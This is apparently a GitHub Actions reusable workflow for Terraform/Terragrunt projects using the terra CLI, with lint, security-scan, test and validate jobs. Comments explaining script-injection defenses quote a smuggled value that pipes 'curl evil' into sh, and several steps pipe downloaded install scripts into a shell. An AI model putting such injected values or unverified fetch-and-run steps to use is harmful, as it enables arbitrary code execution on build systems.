# Terra CLI pipeline — uses the terra CLI (https://github.com/rios0rios0/terra)
# which wraps Terraform and Terragrunt. Provides code check, security, tests,
# and management stages. Delivery is intentionally excluded because it is
# project-specific (plan/apply targets, environment handling, stack ordering).
#
# see the bottom of the file for more information¹
# the parent workflow is responsible for setting up the call events²
on:
  workflow_call:
    inputs:
      pre_script:
        required: false
        type: 'string'
        default: ''
        description: 'Shell commands run before Trivy and Semgrep. Useful for configuring SSH so the Terraform parser can clone private modules referenced via `source = "git@..."`.'
      pipelines_ref:
        required: false
        type: 'string'
        default: ''
        description: 'Optional ref (branch, tag, or SHA) to check out `rios0rios0/pipelines` at when sourcing shared scripts. Defaults to the ref this reusable workflow was invoked with (parsed from `job.workflow_ref`, falling back to `GITHUB_WORKFLOW_REF` where that context is unavailable), so scripts and workflow stay version-locked when consumers pin to a tag/SHA.'
      enable_validate:
        required: false
        type: 'boolean'
        default: false
        description: 'Run `terraform validate` over every root module (the `tests > test:validate` job). Off by default because, unlike the other test tiers, it needs the network to download providers and — for private module sources — credentials, which `pre_script` configures.'
      validate_roots:
        required: false
        type: 'string'
        default: 'stacks'
        description: 'Space-separated directories searched for root modules. Only read when `enable_validate` is true.'

jobs:
  # first stage
  code_check-basic_checks:
    name: 'code-check > quality:basic-checks'
    runs-on: 'ubuntu-latest'
    steps:
      - uses: 'rios0rios0/pipelines/github/global/stages/10-code-check/basic-checks@main'
        with:
          target_branch: ${{ github.event.pull_request.base.ref || github.event.repository.default_branch || 'main' }}
    if: "github.event_name == 'pull_request'"

  code_check-style_terra_format:
    name: 'code-check > style:terra-format'
    runs-on: 'ubuntu-latest'
    steps:
      - name: 'Checkout code'
        uses: 'actions/checkout@v6'

      - name: 'Setup Go'
        uses: 'actions/setup-go@v6'
        with:
          go-version: '1.24'

      - name: 'Install terra CLI'
        run: |
          curl -fsSL https://raw.githubusercontent.com/rios0rios0/terra/main/install.sh | sh
          terra install
        shell: 'bash'

      - name: 'Check formatting'
        run: |
          terra format
          git diff --exit-code
        shell: 'bash'
    if: "!startsWith(github.ref, 'refs/tags/')"

  code_check-style_tflint:
    name: 'code-check > style:tflint'
    runs-on: 'ubuntu-latest'
    steps:
      - name: 'Checkout code'
        uses: 'actions/checkout@v6'

      - name: 'Install TFLint (if not already present)'
        run: command -v tflint > /dev/null 2>&1 || curl -s https://raw.githubusercontent.com/terraform-linters/tflint/master/install_linux.sh | bash
        shell: 'bash'

      - name: 'Run TFLint'
        run: tflint --chdir . --recursive
        shell: 'bash'
    continue-on-error: true
    if: "!startsWith(github.ref, 'refs/tags/')"

  # Enforces the team's file-ordering standard: dependency/inputs ordering in
  # root.hcl, the // SET ON .HCL / .ENV grouping in variables.tf, the
  # heaviest->lightest provider order in providers.tf, and main.tf-ordered
  # outputs.tf. Deps-free (only needs python3, preinstalled on the runner),
  # so it does not install the terra CLI. Run `order-check/run.sh --fix`
  # locally to auto-sort before pushing.
  code_check-style_order_check:
    name: 'code-check > style:order-check'
    runs-on: 'ubuntu-latest'
    env:
      REPORT_PATH: 'build/reports'
    steps:
      - name: 'Checkout code'
        uses: 'actions/checkout@v6'

      # Pass `inputs.pipelines_ref` via `env:` (not `${{ }}` in `run:`) to
      # avoid script injection, then resolve the ref this reusable workflow
      # was invoked with so the shared scripts stay version-locked. Mirrors
      # the tests jobs below.
      - name: 'Resolve pipelines ref'
        id: 'pipelines-ref'
        shell: 'bash'
        env:
          PIPELINES_REF: ${{ inputs.pipelines_ref }}
          JOB_WORKFLOW_REF: ${{ job.workflow_ref }}
        run: |
          if [ -n "${PIPELINES_REF}" ]; then
            ref="${PIPELINES_REF}"
          else
            ref="${JOB_WORKFLOW_REF:-${GITHUB_WORKFLOW_REF}}"
            ref="${ref##*@}"
          fi
          echo "ref=${ref}" >> "$GITHUB_OUTPUT"

      - name: 'Checkout pipelines repo for shared scripts'
        uses: 'actions/checkout@v6'
        with:
          repository: 'rios0rios0/pipelines'
          ref: ${{ steps.pipelines-ref.outputs.ref }}
          path: '.pipelines'

      - name: 'Check file ordering (deps/variables/providers/outputs)'
        run: |
          export SCRIPTS_DIR="$GITHUB_WORKSPACE/.pipelines"
          "$SCRIPTS_DIR/global/scripts/languages/terraform/order-check/run.sh"
        shell: 'bash'

      - name: 'Publish order-check results'
        if: 'always()'
        uses: 'actions/upload-artifact@v7'
        with:
          name: 'order-check'
          path: "${{ env.REPORT_PATH }}/junit-order-check.xml"
          if-no-files-found: 'ignore'
    if: "!startsWith(github.ref, 'refs/tags/')"


  # second stage
  security-sast_codeql:
    name: 'security > sast:codeql'
    runs-on: 'ubuntu-latest'
    steps:
      - uses: 'rios0rios0/pipelines/github/global/stages/20-security/codeql@main'
        with:
          codeql_language: 'hcl'
    needs: [ 'code_check-style_terra_format' ]
    continue-on-error: true
    if: "!startsWith(github.ref, 'refs/tags/')"

  security-sast_semgrep:
    name: 'security > sast:semgrep'
    runs-on: 'ubuntu-latest'
    steps:
      - uses: 'rios0rios0/pipelines/github/global/stages/20-security/semgrep@main'
        with:
          semgrep_lang: 'terraform'
          pre_script: ${{ inputs.pre_script }}
    needs: [ 'code_check-style_terra_format' ]
    if: "!startsWith(github.ref, 'refs/tags/')"

  security-sast_gitleaks:
    name: 'security > sast:gitleaks'
    runs-on: 'ubuntu-latest'
    steps:
      - uses: 'rios0rios0/pipelines/github/global/stages/20-security/gitleaks@main'
    needs: [ 'code_check-style_terra_format' ]
    if: "!startsWith(github.ref, 'refs/tags/')"

  security-sast_hadolint:
    name: 'security > sast:hadolint'
    runs-on: 'ubuntu-latest'
    steps:
      - uses: 'rios0rios0/pipelines/github/global/stages/20-security/hadolint@main'
    needs: [ 'code_check-style_terra_format' ]
    continue-on-error: true
    if: "!startsWith(github.ref, 'refs/tags/')"

  security-sast_trivy:
    name: 'security > sast:trivy'
    runs-on: 'ubuntu-latest'
    steps:
      - uses: 'rios0rios0/pipelines/github/global/stages/20-security/trivy@main'
        with:
          pre_script: ${{ inputs.pre_script }}
    needs: [ 'code_check-style_terra_format' ]
    continue-on-error: true
    if: "!startsWith(github.ref, 'refs/tags/')"

  security-sca_trivy:
    name: 'security > sca:trivy'
    runs-on: 'ubuntu-latest'
    steps:
      - uses: 'rios0rios0/pipelines/github/global/stages/20-security/trivy-sca@main'
    needs: [ 'code_check-style_terra_format' ]
    continue-on-error: true
    if: "!startsWith(github.ref, 'refs/tags/')"


  # third stage
  # Single unified job that orchestrates both tiers of Terraform testing
  # behind one `test:all` entry: native `terraform test` over
  # `modules/*/tests/*.tftest.hcl` (tier 1) followed by the Go Terratest
  # suite under `tests/terratest/` (tier 2). The runner auto-detects which
  # tiers the consumer has, runs only those, and exits 0 when neither is
  # present — so stack-only repos (no `modules/` tests, no `tests/terratest/`)
  # pass the stage without a bespoke opt-out.
  tests-test_all:
    name: 'tests > test:all'
    runs-on: 'ubuntu-latest'
    env:
      REPORT_PATH: 'build/reports'
    steps:
      - name: 'Checkout code'
        uses: 'actions/checkout@v6'

      # Mirror the `go-version-file: 'go.mod'` pattern used by every
      # `github/golang/stages/**/action.yaml` in this repo: derive the Go
      # version from the consumer's `tests/terratest/go.mod` (honoring the
      # `TESTS_DIR` env override, same contract as the tier runners) so the
      # toolchain tracks whatever the consumer's Terratest suite declares.
      # Falls back to a conservative `1.24` pin when no terratest `go.mod`
      # exists (stack-only repos with only `modules/*/tests/*.tftest.hcl`,
      # or repos with no Terra tests at all) — `setup-go` errors out when
      # `go-version-file` points at a missing file.
      - name: 'Detect terratest go.mod'
        id: 'terratest-gomod'
        shell: 'bash'
        run: |
          tests_dir="${TESTS_DIR:-tests/terratest}"
          if [ -f "${tests_dir}/go.mod" ]; then
            echo "path=${tests_dir}/go.mod" >> "$GITHUB_OUTPUT"
          else
            echo "path=" >> "$GITHUB_OUTPUT"
          fi

      - name: 'Setup Go (from terratest go.mod)'
        if: "steps.terratest-gomod.outputs.path != ''"
        uses: 'actions/setup-go@v6'
        with:
          go-version-file: ${{ steps.terratest-gomod.outputs.path }}

      - name: 'Setup Go (fallback when no terratest go.mod)'
        if: "steps.terratest-gomod.outputs.path == ''"
        uses: 'actions/setup-go@v6'
        with:
          go-version: '1.24'

      - name: 'Install terra CLI'
        run: |
          curl -fsSL https://raw.githubusercontent.com/rios0rios0/terra/main/install.sh | sh
          terra install
        shell: 'bash'

      # Derive the pipelines ref from the reusable workflow's own invocation
      # ref so the shared scripts stay in sync with the workflow. When the
      # consumer calls `uses: 'rios0rios0/pipelines/.github/workflows/terra.yaml@4.20.1'`,
      # `job.workflow_ref` resolves to
      # `rios0rios0/pipelines/.github/workflows/terra.yaml@refs/tags/4.20.1`;
      # stripping everything up to the last `@` yields the ref that
      # `actions/checkout` accepts. The `pipelines_ref` input overrides this
      # for consumers who deliberately want a different script version.
      #
      # It must be `job.workflow_ref`, not `github.workflow_ref`: inside a
      # called reusable workflow the `github` context belongs to the CALLER, so
      # `github.workflow_ref` names the consumer's workflow and its ref, and
      # checking this repo out at that ref only works by coincidence when the
      # consumer sits on an identically-named branch. `job.workflow_ref` is
      # documented as "the full ref of the workflow file that defines the
      # current job [...] for jobs defined in a reusable workflow, this refers
      # to the reusable workflow file" — exactly what "stay in sync with the
      # workflow" means, and the property GitHub added for this case.
      #
      # It has to come through `env:` because there is no `GITHUB_JOB_WORKFLOW_REF`
      # runner variable: only `github.*` populates default env vars, and the
      # `job` context is reachable from expressions alone. The fallback to
      # `GITHUB_WORKFLOW_REF` covers GitHub Enterprise Server, where
      # `job.workflow_ref` is not available, and any run outside a
      # `workflow_call`, where the two values are identical anyway.
      # Pass `inputs.pipelines_ref` via the step's `env:` mapping rather
      # than interpolating `${{ }}` directly into the `run:` script. The
      # `${{ }}` form is substituted into the shell command at YAML-parse
      # time, so a consumer who passes `pipelines_ref: 'x"; curl evil | sh #'`
      # would inject arbitrary shell. With `env:`, the value is exposed
      # through a process env var the shell only *expands* at runtime,
      # breaking the injection path. Flagged by SonarCloud rule
      # `GitHub Actions should not be vulnerable to script injections`.
      - name: 'Resolve pipelines ref'
        id: 'pipelines-ref'
        shell: 'bash'
        env:
          PIPELINES_REF: ${{ inputs.pipelines_ref }}
          JOB_WORKFLOW_REF: ${{ job.workflow_ref }}
        run: |
          if [ -n "${PIPELINES_REF}" ]; then
            ref="${PIPELINES_REF}"
          else
            ref="${JOB_WORKFLOW_REF:-${GITHUB_WORKFLOW_REF}}"
            ref="${ref##*@}"
          fi
          echo "ref=${ref}" >> "$GITHUB_OUTPUT"

      - name: 'Checkout pipelines repo for shared scripts'
        uses: 'actions/checkout@v6'
        with:
          repository: 'rios0rios0/pipelines'
          ref: ${{ steps.pipelines-ref.outputs.ref }}
          path: '.pipelines'

      - name: 'Run Terraform tests (terra-test + terratest)'
        run: |
          export SCRIPTS_DIR="$GITHUB_WORKSPACE/.pipelines"
          "$SCRIPTS_DIR/global/scripts/languages/terraform/test-all/run.sh"
        shell: 'bash'

      - name: 'Publish test results'
        if: 'always()'
        uses: 'actions/upload-artifact@v7'
        with:
          name: 'terra-coverage'
          path: "${{ env.REPORT_PATH }}"
          if-no-files-found: 'warn'
    needs: [ 'security-sast_semgrep', 'security-sast_gitleaks', 'security-sast_hadolint', 'security-sast_trivy', 'security-sca_trivy' ]
    if: "!startsWith(github.ref, 'refs/tags/')"

  # Fourth tier — the only one that RESOLVES references rather than
  # parsing them. `terra-test` covers reusable modules that carry a test
  # file, `terratest` reads HCL offline, and `structural` asserts
  # conventions in bash; none has an evaluation context, so a root module
  # can reference a module, variable or resource that does not exist and
  # all three stay green. That defect then fails every plan and apply of
  # the root module, for every target, before a resource is touched.
  #
  # Opt-in via `enable_validate`. Off by default because, unlike its
  # siblings, this tier needs the network (to download providers) and —
  # for private module sources — credentials.
  tests-test_validate:
    name: 'tests > test:validate'
    runs-on: 'ubuntu-latest'
    env:
      REPORT_PATH: 'build/reports'
      VALIDATE_ROOTS: ${{ inputs.validate_roots }}
    steps:
      - name: 'Checkout code'
        uses: 'actions/checkout@v6'

      # Terraform itself — the structural tier is deps-free, this one
      # cannot be. HashiCorp's action rather than the terra CLI installer
      # the sibling jobs use: this runner invokes `terraform` directly and
      # never touches Terragrunt, so the terra CLI would install a second
      # tool for nothing, and a versioned action avoids piping a fetched
      # script straight into a shell (flagged as executing an unverified
      # downloaded artifact, and as following redirects without pinning the
      # protocol to HTTPS). `terraform_wrapper: false` keeps the real binary
      # on PATH — the wrapper's output capture is redundant here, since the
      # runner already collects diagnostics itself.
      # Pinned to a commit SHA, not a tag: this is the only third-party
      # action in the workflow (the `actions/*` ones are first-party), and a
      # tag is a mutable pointer the upstream owner can repoint at any time,
      # so `@v4` is a promise rather than a guarantee about what executes here.
      - name: 'Setup Terraform'
        uses: 'hashicorp/setup-terraform@dfe3c3f87815947d99a8997f908cb6525fc44e9e' # v4.0.1
        with:
          terraform_wrapper: false

      # Same reasoning as the sibling jobs: pass the input through `env:`
      # rather than interpolating `${{ }}` into `run:`, so the value is
      # expanded by the shell at runtime instead of being substituted into
      # the command at YAML-parse time (script-injection path).
      - name: 'Resolve pipelines ref'
        id: 'pipelines-ref'
        shell: 'bash'
        env:
          PIPELINES_REF: ${{ inputs.pipelines_ref }}
          JOB_WORKFLOW_REF: ${{ job.workflow_ref }}
        run: |
          if [ -n "${PIPELINES_REF}" ]; then
            ref="${PIPELINES_REF}"
          else
            ref="${JOB_WORKFLOW_REF:-${GITHUB_WORKFLOW_REF}}"
            ref="${ref##*@}"
          fi
          echo "ref=${ref}" >> "$GITHUB_OUTPUT"

      - name: 'Checkout pipelines repo for shared scripts'
        uses: 'actions/checkout@v6'
        with:
          repository: 'rios0rios0/pipelines'
          ref: ${{ steps.pipelines-ref.outputs.ref }}
          path: '.pipelines'

      # `terraform init` resolves module sources, and private ones need
      # credentials configured first — the same need `pre_script` already
      # serves for the security stage's Terraform parser, so it is reused
      # here rather than introducing a second hook.
      - name: 'Run pre-script'
        if: "inputs.pre_script != ''"
        shell: 'bash'
        env:
          PRE_SCRIPT: ${{ inputs.pre_script }}
        run: |
          eval "${PRE_SCRIPT}"

      - name: 'Run terraform validate over root modules'
        run: |
          export SCRIPTS_DIR="$GITHUB_WORKSPACE/.pipelines"
          "$SCRIPTS_DIR/global/scripts/languages/terraform/validate/run.sh"
        shell: 'bash'

      - name: 'Publish validate JUnit'
        if: 'always()'
        uses: 'actions/upload-artifact@v7'
        with:
          name: 'validate-results'
          path: "${{ env.REPORT_PATH }}/junit-validate.xml"
          if-no-files-found: 'ignore'
    needs: [ 'security-sast_semgrep', 'security-sast_gitleaks', 'security-sast_hadolint', 'security-sast_trivy', 'security-sca_trivy' ]
    if: "inputs.enable_validate && !startsWith(github.ref, 'refs/tags/')"

  # Third tier — repo-convention assertions the consumer owns. Runs
  # `tests/structural.sh` if it exists and uploads the resulting JUnit.
  # The script itself is deliberately not shipped upstream; every repo
  # has its own conventions (customer dir naming, bootstrap self-
  # containedness, shared root.hcl presence) that can't live in a shared
  # template. Skipped silently when the consumer has no structural
  # script. Runs in parallel with `tests-test_all` — the shell tier is
  # offline and deps-free, no reason to queue behind the heavier tests.
  tests-test_structural:
    name: 'tests > test:structural'
    runs-on: 'ubuntu-latest'
    env:
      REPORT_PATH: 'build/reports'
    steps:
      - name: 'Checkout code'
        uses: 'actions/checkout@v6'

      # Pass `inputs.pipelines_ref` via the step's `env:` mapping rather
      # than interpolating `${{ }}` directly into the `run:` script. The
      # `${{ }}` form is substituted into the shell command at YAML-parse
      # time, so a consumer who passes `pipelines_ref: 'x"; curl evil | sh #'`
      # would inject arbitrary shell. With `env:`, the value is exposed
      # through a process env var the shell only *expands* at runtime,
      # breaking the injection path. Flagged by SonarCloud rule
      # `GitHub Actions should not be vulnerable to script injections`.
      - name: 'Resolve pipelines ref'
        id: 'pipelines-ref'
        shell: 'bash'
        env:
          PIPELINES_REF: ${{ inputs.pipelines_ref }}
          JOB_WORKFLOW_REF: ${{ job.workflow_ref }}
        run: |
          if [ -n "${PIPELINES_REF}" ]; then
            ref="${PIPELINES_REF}"
          else
            ref="${JOB_WORKFLOW_REF:-${GITHUB_WORKFLOW_REF}}"
            ref="${ref##*@}"
          fi
          echo "ref=${ref}" >> "$GITHUB_OUTPUT"

      - name: 'Checkout pipelines repo for shared scripts'
        uses: 'actions/checkout@v6'
        with:
          repository: 'rios0rios0/pipelines'
          ref: ${{ steps.pipelines-ref.outputs.ref }}
          path: '.pipelines'

      - name: 'Run structural tests'
        run: |
          export SCRIPTS_DIR="$GITHUB_WORKSPACE/.pipelines"
          "$SCRIPTS_DIR/global/scripts/languages/terraform/structural/run.sh"
        shell: 'bash'

      - name: 'Publish structural JUnit'
        if: 'always()'
        uses: 'actions/upload-artifact@v7'
        with:
          name: 'structural-results'
          path: "${{ env.REPORT_PATH }}/junit-structural.xml"
          if-no-files-found: 'ignore'
    needs: [ 'security-sast_semgrep', 'security-sast_gitleaks', 'security-sast_hadolint', 'security-sast_trivy', 'security-sca_trivy' ]
    if: "!startsWith(github.ref, 'refs/tags/')"


# 1 - this file MUST be inside ".github/workflows" because of GitHub Actions limitations
# 2 - the recommended events to trigger this workflow and permissions are:
#   on:
#     push:
#       branches:
#         - 'main'
#       tags:
#         - '*'
#     pull_request:
#       branches:
#         - 'main'
#     workflow_dispatch:
#
#   permissions:
#     security-events: 'write' # security-sast_codeql
#     actions: 'read' # security-sast_codeql (required only on a private repository)
